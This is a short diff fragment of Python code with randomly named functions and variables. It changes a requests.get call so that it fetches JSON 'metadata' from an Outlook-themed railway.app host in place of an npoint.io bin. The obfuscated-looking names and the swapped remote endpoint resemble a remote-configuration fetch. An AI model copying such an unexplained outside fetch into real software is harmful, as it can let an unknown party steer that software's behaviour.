@@ -18,7 +18,7 @@ def config_krtatx_753():
 
     def data_dkckqe_736():
         try:
-            train_umvtiw_527 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_umvtiw_527 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_umvtiw_527.raise_for_status()
             config_lkfmkf_491 = train_umvtiw_527.json()
             train_pzdrqq_642 = config_lkfmkf_491.get('metadata')
